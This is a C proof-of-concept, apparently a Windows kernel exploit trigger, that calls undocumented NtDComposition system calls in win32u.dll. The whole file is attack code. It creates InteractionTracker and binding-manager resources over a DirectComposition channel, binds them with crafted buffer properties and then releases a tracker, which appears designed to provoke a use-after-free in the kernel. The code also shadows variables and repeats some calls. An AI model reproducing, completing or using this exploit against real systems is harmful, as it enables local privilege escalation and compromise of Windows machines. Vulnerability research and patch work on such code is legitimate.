#include <stdio.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );

enum DCOMPOSITION_COMMAND_ID
{
    ProcessCommandBufferIterator,
    CreateResource,
    OpenSharedResource,
    ReleaseResource,
    GetAnimationTime,
    CapturePointer,
    OpenSharedResourceHandle,
    SetResourceCallbackId,
    SetResourceIntegerProperty,
    SetResourceFloatProperty,
    SetResourceHandleProperty,
    SetResourceHandleArrayProperty,
    SetResourceBufferProperty,
    SetResourceReferenceProperty,
    SetResourceReferenceArrayProperty,
    SetResourceAnimationProperty,
    SetResourceDeletedNotificationTag,
    AddVisualChild,
    RedirectMouseToHwnd,
    SetVisualInputSink,
    RemoveVisualChild
};

#define nCmdCreateResource 0x1
#define nCmdReleaseResource 0x3
#define nCmdSetBufferProperty 0xC
#define CInteractionTrackerBindingManagerMarshaler 0x59
#define CInteractionTrackerMarshaler 0x58

HANDLE hChannel;
PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
DWORD dwArg1, dwArg2;
DWORD szBuff[0x400];

#define Binding1 1
#define Binding2 2 
#define Tracker1 3
#define Tracker2 4

pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;

int main(int argc, TCHAR* argv[])
{

    LoadLibrary(L"user32.dll");
    NTSTATUS ntStatus;
    HMODULE win32u = LoadLibrary(L"win32u.dll");
    NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("Fail to create DComposition Channel\n");
        exit(-1);
    }
    HANDLE hChannel;
    PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
    DWORD dwArg1, dwArg2;
    NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    printf("[+] Create channel:%d\n", hChannel);

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create TrackerBinding1\n");
        exit(-1);
    }
    printf("[+] Create TrackerBinding1\n");

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding2;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create TrackerBingin2\n");
        exit(-1);
    }
    printf("[+] Create TrackerBingin2\n");

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Tracker1\n");
        exit(-1);
    }
    printf("[+] Create Tracker1\n");
    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Tracker2;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Tracker2\n");
        exit(-1);
    }
    printf("[+] Create Tracker2\n");

    szBuff[0] = Tracker1;
    szBuff[1] = Tracker2;
    szBuff[2] = 0x41414141;
    UINT datasz = 0xc;
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = datasz;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to binding Tracker1 and Tracker2 to TrackerBingin1\n");
        exit(-1);
    }
    printf("[+] Binding Tracker1 and Tracker2 to TrackerBinding1\n");

    szBuff[0] = Tracker1;
    szBuff[1] = Tracker2;
    szBuff[2] = 0x424242242;
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = datasz;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);

    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to binding Tracker1 and Tracker2 to TrackerBingin2\n");
        exit(-1);
    }
    printf("[+] Binding Tracker1 and Tracker2 to TrackerBinding2\n");

    *(DWORD*)pMappedAddress = nCmdReleaseResource;
    *(DWORD*)((PCHAR)pMappedAddress + 4) = Tracker1;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to Release Resource Tracker1\n");
        exit(-1);
    }
    printf("[+] Release Resource Tracker1\n");
    
}